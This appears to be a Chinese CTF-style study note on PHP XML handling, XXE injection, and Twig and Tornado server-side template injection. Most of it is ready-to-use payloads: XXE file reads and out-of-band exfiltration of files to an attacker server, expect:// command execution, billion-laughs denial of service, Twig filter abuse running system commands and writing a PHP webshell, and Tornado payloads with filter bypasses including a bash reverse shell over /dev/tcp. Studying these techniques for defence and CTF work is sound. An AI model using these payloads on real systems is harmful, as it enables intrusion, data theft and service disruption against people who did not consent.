$xmlDoc->load("test.xml");
# saveXML() 函数把内部 XML 文档放入一个字符串，然后直接将XML内容当作字符串输出
echo $xmlDoc->saveXML();

# 输出
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

#### 1.4 遍历XML

当 XML 生成时，它通常会在节点之间包含空白。XML DOM 解析器把它们当作普通的元素，如果您不注意它们，有时会产生问题。

```php
<?php
$xmlDoc = new DOMDocument();
$xmlDoc->load("test.xml");

$x = $xmlDoc->documentElement;
foreach ($x->childNodes AS $item){
    echo $item->nodeName."=".$item->nodeValue."<br/>";
}

# 输出
#text=
    <br/>to=Tove<br/>#text=
    <br/>from=Jani<br/>#text=
    <br/>heading=Reminder<br/>#text=
    <br/>body=Don't forget me this weekend!<br/>#text=
<br/>
```

### 2. PHP Simple XML

SimpleXML 可把 XML 文档（或 XML 字符串）转换为对象，比如：

- 元素被转换为 `SimpleXMLElement` 对象的单一属性。当同一级别上存在多个元素时，它们会被置于**数组**中。
- 属性通过使用**关联数组**进行访问，其中的**索引对应属性名称**。
- 元素内部的文本被转换为字符串。如果一个元素拥有多个文本节点，则按照它们被找到的顺序进行排列。

```php
<?php
$xml = simplexml_load_file("test.xml");
print_r($xml);

# 输出
SimpleXMLElement Object
(
    [to] => Tove
    [from] => Jani
    [heading] => Reminder
    [body] => Don't forget me this weekend!
)
```

## 2. XML基础知识

### 2.1 XML

`XML`即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：

- HTML 被设计用来**显示数据**
- XML 被设计用来**传输和存储数据**

XML文档结构包括：

- XML声明
- DTD文档类型定义（可选）
- 文档元素

```xml
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>

<!--文档元素-->                                                                          
<foo>&xxe;</foo>

```

### 2.2 DTD概念及声明/引用方式

DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。

DTD一般认为有两种引用或声明方式：

- 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。
- 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。

DTD实体有以下几种声明方式

**内部实体**

```xml
<!DOCTYPE note [
    <!ENTITY a "admin">
]>
<note>&a</note>
<!-- admin -->
```

PHP 代码解析	

```php
<?php
# 将XML文档转换为对象
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
# 强转 SimpleXMLElement，该类自带：__toString() 方法，可返回元素的文本内容
var_dump((string)$xml);
```

**参数实体**

```xml
<!DOCTYPE note[
        <!ENTITY % b "<!ENTITY b1 'aws1'>">
        %b;
        ]>
<note>&b1;</note>
<!-- aws1 -->
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml)
```

- 参数实体用`% name`申明，引用时用`%name;`，只能在`DTD`中申明，`DTD`中引用。
- 其余实体直接用`name`申明，引用时用`&name;`，只能在`DTD`中申明，可在`xml`文档中引用

**外部实体**

```xml
<!DOCTYPE note> [
    <!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
]>
<note>&c</note>
<!-- PD9waHANCiRmbGFnID0gImZsYWcgaXMgdGhpcyI7DQplY2hvICRmbGFnOw0K -->
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml);
```

外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1270588-20200115235522292-2141935835.png)

上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1270588-20200115235555856-2031563427.png)

**外部参数实体**

```xml
<!DOCTYPE note> [
    <!ENTITY % d SYSTEM "http://127.0.0.1/test.dtd">
    %d;
]>
<note>&d1</note>
<!-- sugar -->
```

http://127.0.0.1/test.dtd

```xml
<!ENTITY d1 SYSTEM "data://text/plain;base64,c3VnYXI=">
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml);
```

## 3. XML 外部实体注入

#### 3.1 任意文件读取

最简单也是最常用的利用方式
一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。

##### 有回显

**恶意引入外部实体**

直接读靶机文件，这里支持常用的PHP伪协议

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [
        <!ENTITY rabbit SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" >
        ]>
<user><username>&rabbit;</username><password>123</password></user>
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump((string)$xml->username);
var_dump((string)$xml->password);
```

**恶意引入外部参数实体**

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://127.0.0.1/hack.dtd">
        %file;
        ]>
<test>&hhh;</test>
```

hack.dtd

```xml
<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=D:/flag.txt'>
```

PHP代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump((string)$xml);
```

##### 无回显

先使用`php://filter`获取目标文件的内容，然后将内容以`http`请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。

```xml
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php">
    <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
    %dtd;
    %send;
]>
```

evil.dtd的内容，内部的%号要进行实体编码成&#x25。

```xml
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'>"
>
%all;
```

访问接受数据的服务器中的**日志信息**，可以看到经过base64编码过的数据，解码后便可以得到数据。

流程：

1. file 实体获取敏感文件数据：`target.php`
2. dtd 实体获取服务器的dtd文件并执行
3. sned 实体带着数据访问服务器	

##### 基于报错

> 基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。
> 所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。

**通过引入服务器文件**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % remote SYSTEM "http://blog.szfszf.top/xml.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
	%remote;
	%send;
]>
<message>1234</message>
```

xml.dtd

```xml
<!-- xml.dtd -->
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///hhhhhhh/%file;'>">		<!-- 不同点在这里，构造了一个无法访问的URL然错误信息回弹 -->
%start;
```

##### 通过引入本地文件

如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件（引入系统自带的DTD文件），并在其中定义一些实体内容就行。

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
	<!ENTITY % ISOamso '
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">
		&#x25;eval;
		&#x25;send;
	'> 
	%remote;
]>
<message>1234</message>

```

我们仔细看一下很好理解，第一个调用的参数实体是%remote，在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send

##### 嵌套参数实体

> 我发现，虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">  
	<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
	%start;
	%send;
]>
<message>10</message>
```

基于报错的三层嵌套参数实体XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ELEMENT message ANY>
	<!ENTITY % para1 SYSTEM "file:///flag">
	<!ENTITY % para '
		<!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
		&#x25;para2;
	'>
	%para;
]>
<message>10</message>
```

#### 3.2 内网探测

和读文件差不多，只不过把URI改成内网机器地址；只能探测内网web服务器

```xml
<?xml version="1.0" encoding="UTF-8"?>        
<!DOCTYPE foo [ 
<!ELEMENT foo ANY >
<!ENTITY rabbit SYSTEM "http://127.0.0.1/1.txt" >
]>
<user><firstname>&rabbit;</firstname><lastname>666</lastname></user>
```

#### 3.3 RCE

这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2018-10-01</date>
      <description>&xxe;</description>
   </core>
</catalog>
```

响应：

```
{"error": "no results for description uid=0(root) gid=0(root) groups=0(root)...
```

#### 3.4 DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。亦或者，如果目标是UNIX系统，XML 解析器尝试使用`/dev/random`文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>
```

## 4. XXE黑盒注入

### 4.1 XML数据传输特征

![屏幕截图 2023-11-23 085738](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-23%20085738.jpg)

### 4.2 XXE注入读取文件

```xml-dtd
payload：
<!DOCTYPE ANY [<!ENTITY test SYSTEM "file:///flag">]>
<user><username>&test;</username><password>note</password></user>
```

![image-20231123092247282](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092247282.png)

### 4.3 无回显带外测试

#### 4.3.1 申请域名

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092647688.png" alt="image-20231123092647688" style="zoom:50%;" />

#### 4.3.2 带外注入尝试

```xml-dtd
payload：
<?xml version="1.0" ?>
<!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://afqxpc.dnslog.cn">
        %file;
        ]>
<user><username>&file;</username><password>note</password></user>
```

#### 3.3.3 刷新查看结果

由此可看出靶机确实访问了该站点。证明了的确存在XXE注入lou'd

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092759541.png" alt="image-20231123092759541" style="zoom:67%;" />

# Twig 模板注入

## 1. Twig 安装

建议通过 Composer 安装 Twig：我的Windows在直接在项目文件夹下执行这条命令即可

```
composer require "twig/twig:^3.0"
```

## 2. 注入原理

和其他的模板注入一样，Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：

这里的代码中，`createTemplate` 时注入了 `$_GET['name']`，此时就会引发模板注入。

```php
<?php
require_once __DIR__.'/vendor/autoload.php';
$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}");
echo $template->render();
```

![image-20231125121342568](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231125121342568.png)

而如下代码则不会，因为模板引擎解析的是字符串常量中的 `{{name}}`，而不是动态拼接的 `$_GET["name"]`：这里的`{{name}}`由开发者静态指定

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```

## 3. Twig 1.x 注入

测试代码如下：

- index.php

```
<?php

include __DIR__.'/vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
echo $twig->render($_GET['name']);
?>
```

在 Twig 1.x 中存在三个全局变量：

- `_self`：引用当前模板的实例。
- `_context`：引用当前上下文。
- `_charset`：引用当前字符集。

对应的代码是：

```
protected $specialVars = [
        '_self' => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    ];
```

这里主要就是利用 `_self` 变量，它会返回当前 `\Twig\Template` 实例，并提供了指向 `Twig_Environment` 的 `env` 属性，这样我们就可以继续调用 `Twig_Environment` 中的其他方法，从而进行 SSTI。

比如以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include` 开启的情况下我们可以通过改变路径实现远程文件包含：

```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

此外还有 `getFilter` 方法：

```
public function getFilter($name)
  {
    ...
    foreach ($this->filterCallbacks as $callback) {
    if (false !== $filter = call_user_func($callback, $name)) {
      return $filter;
    }
  }
  return false;
}

public function registerUndefinedFilterCallback($callable)
{
  $this->filterCallbacks[] = $callable;
}
```

我们在 `getFilter` 里发现了危险函数 `call_user_func`。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. Twig 2.注入

- index.php

```
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

到了 Twig 2.x / 3.x 版本中，`__self` 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。

### 4.1 使用 map 过滤器

在 Twig 3.x 中，`map` 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：

```
{% set people = [
    {first: "Bob", last: "Smith"},
    {first: "Alice", last: "Dupond"},
] %}

{{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond


{% set people = {
    "Bob": "Smith",
    "Alice": "Dupond",
} %}

{{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond
```

当我们如下使用 `map` 时：

```
{{["Mark"]|map((arg)=>"Hello #{arg}!")}}
```

Twig 3.x 会将其编译成：

```
twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
```

这个 `twig_array_map` 函数的源码如下：

```
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    }

    return $r;
}
```

从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 value 和 key。`$array` 和 `$arrow` 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：

```
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

前三个都可以使用。相应的 Payload 如下：

```
{{["id"]|map("system")}}
{{["id"]|map("passthru")}}
{{["id"]|map("exec")}}    // 无回显
```

其中，`{{["id"]|map("system")}}` 会被成下面这样：

```
twig_array_map([0 => "id"], "sysetm")
```

如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码：

```
{{["phpinfo();"]|map("assert")|join(",")}}
{{{"<?php phpinfo();eval($_POST[whoami])":"/var/www/html/shell.php"}|map("file_put_contents")}}    // 写 Webshell
```

按照 `map` 的利用思路，我们去找带有 `$arrow` 参数的，可以发现下面几个过滤器也是可以利用的。

### 4.2 使用 sort 过滤器

这个 `sort` 筛选器可以用来对数组排序。

```
{% for user in users|sort %}
    ...
{% endfor %}
```

你可以传递一个箭头函数来对数组进行排序：

```
{% set fruits = [
    { name: 'Apples', quantity: 5 },
    { name: 'Oranges', quantity: 2 },
    { name: 'Grapes', quantity: 4 },
] %}

{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}

// Output in this order: Oranges, Grapes, Apples
```

类似于 `map`，模板编译的过程中会进入 `twig_sort_filter` 函数，这个 `twig_sort_filter` 函数的源码如下：

```
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow);    // 直接被 uasort 调用 
    } else {
        asort($array);
    }

    return $array;
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `uasort` 函数调用。众所周知 `uasort` 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：

```
php > $arr = ["id",0];
php > usort($arr,"system");
uid=0(root) gid=0(root) groups=0(root)
php >
```

知道了做这些我们便可以构造 Payload 了：

```
{{["id", 0]|sort("system")}}
{{["id", 0]|sort("passthru")}}
{{["id", 0]|sort("exec")}}    // 无回显
```

### 4.3 使用 filter 过滤器

这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：

```
{% set lists = [34, 36, 38, 40, 42] %}
{{ lists|filter(v => v > 38)|join(', ') }}

// Output: 40, 42
```

类似于 `map`，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下：

```
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_filter` 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：

```
php > $arr = ["id"];
php > array_filter($arr,"system");
uid=0(root) gid=0(root) groups=0(root)
php >
```

下面给出几个 Payload：

```
{{["id"]|filter("system")}}
{{["id"]|filter("passthru")}}
{{["id"]|filter("exec")}}    // 无回显
```

### 4.4 使用reduce过滤器

这个 `reduce` 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：

```
{% set numbers = [1, 2, 3] %}
{{ numbers|reduce((carry, v) => carry + v) }}
// Output: 6
```

类似于 `map`，模板编译的过程中会进入 `twig_array_reduce` 函数，这个 `twig_array_reduce` 函数的源码如下：

```
function twig_array_reduce($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_reduce` 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。

直接给出 Payload：

```
{{[0, 0]|reduce("system", "id")}}
{{[0, 0]|reduce("passthru", "id")}}
{{[0, 0]|reduce("exec", "id")}}    // 无回显
```

# tornado 模板注入

> 参考：https://xz.aliyun.com/t/12260#toc-8

## 1. 常规手法:

Tornado中SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活：

```
{{ __import__("os").system("whoami") }}
{% apply __import__("os").system %}id{% end %}
{% raw __import__("os").system("whoami") %}
```

## 2. 利用 HTTPServerRequest：

为了方便下面把 `tornado.httputil.HTTPServerRequest` 的实例称为 `request`。

注意，由于属性非常多，属性自己也还有属性。所以这部分我只列了一些我感觉会用到的属性，肯定不全，有特殊需求的话需要自行进行挖掘。

**绕过字符限制**：

- `request.query`：包含 get 参数
- `request.query_arguments`：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）
- `request.arguments`：包含 get、post 参数
- `request.body`：包含 post 参数
- `request.body_arguments`：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）
- `request.cookies`：就是 cookie
- `request.files`：上传的文件
- `request.headers`：请求头
- `request.full_url`：完整的 url
- `request.uri`：包含 get 参数的 url。有趣的是，直接 `str(requests)` 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 `.` 或者 `getattr` 之类的函数了。
- `request.host`：Host 头
- `request.host_name`：Host 头

```
{{request.method}}  //返回请求方法名  GET|POST|PUT...
{{request.query}}  //传入?a=123 则返回a=123
{{request.arguments}}   //返回所有参数组成的字典
{{request.cookies}}   //同{{handler.cookies}}
```

**回显结果**

- `request.connection.write`
- `request.connection.stream.write`
- `request.server_connection.stream.write`

例如：

```
{%raw request.connection.write(("HTTP/1.1 200 OK\r\nCMD: "+__import__("os").popen("id").read()).encode()+b"hacked: ")%}'
```

### 2.1 利用 Application:

主要用于攻击的有这几个属性：

```
- Application.settings：web 服务的配置，可能会泄露一些敏感的配置
- Application.add_handlers：新增一个服务处理逻辑，可用于制作内存马，后面会一起说
- Application.wildcard_router.add_rules：新增一个 url 处理逻辑，可用于制作内存马
- Application.add_transform：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马
```

### 2.1 利用 RequestHandler:

为了方便下面把 `tornado.web.RequestHandler` 称为 `handler`。需要注意的是，handler 是有 `request` 属性的，所以理论上 handler 要比 request 实用。

```
{{handler.get_argument('yu')}}   //比如传入?yu=123则返回值为123
{{handler.cookies}}  //返回cookie值
{{handler.get_cookie("data")}}  //返回cookie中data的值
{{handler.decode_argument('\u0066')}}  //返回f，其中\u0066为f的unicode编码
{{handler.get_query_argument('yu')}}  //比如传入?yu=123则返回值为123
{{handler.settings}}  //比如传入application.settings中的值
```

**绕过字符限制**:

1. `RequestHandler.request.*`：参考利用 `HTTPServerRequest` 那节
2. 其他和 request 一样的方法：例如 `get_argument` 等等，就不一一列举了，可以参考官方文档

**回显结果**:

```
- RequestHandler.set_cookie：设置 cookie
- RequestHandler.set_header：设置一个新的响应头
- RequestHandler.redirect：重定向，可以通过 location 获取回显
- RequestHandler.send_error：发送错误码和错误信息
- RequestHandler.write_error：同上，被 `send_error` 调用
```

## 绕过：

### global()函数全局调用&绕过`_`:

我们可以发现在tornado中是可以直接使用global()函数的，更令我们兴奋的是竟然可以直接调用一些python的初始方法，比如**import**、eval、print、hex等，这下似乎我们的payload可以更加简洁了

```
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}
```

其中第二种方法更多的是为了我们刚才讲到的目的，绕过对`_`的过滤。

```
{{eval(handler.get_argument('yu'))}}
?yu=__import__("os").popen("ls").read()
```

### 绕过`.`：

因为tornado中没有过滤器，这样的话我们想要绕过对于.的过滤就有些困难了。而如果想要绕过对于引号的过滤，可以将上面的payload改成如下格式

```
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
```

### 无过滤payload ：

```
1、读文件
{% extends "/etc/passwd" %}
{% include "/etc/passwd" %}

2、 直接使用函数
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}

3、导入库
{% import os %}{{os.popen("ls").read()}}

4、flask中的payload大部分也通用
{{"".__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__["popen"]('ls').read()}}
{{"".__class__.__mro__[-1].__subclasses__()[x].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

其中"".__class__.__mro__[-1].__subclasses__()[133]为<class 'os._wrap_close'>类
第二个中的x为有__builtins__的class

5、利用tornado特有的对象或者方法
{{handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
{{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']("__import__('os').popen('ls').read()")}}

6、利用tornado模板中的代码注入
{% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
```

过滤payload：

```
1.过滤一些关键字如import、os、popen等（过滤引号该方法同样适用）
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
2.过滤了括号未过滤引号
{% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
3.过滤括号及引号
下面这种方法无回显，适用于反弹shell，为什么用exec不用eval呢？
是因为eval不支持多行语句。
__import__('os').system('bash -i >& /dev/tcp/xxx/xxx 0>&1')%0a"""%0a&data={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&%0a"""
4.其他
通过参考其他师傅的文章学到了下面的方法（两个是一起使用的）
{{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
{{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
```
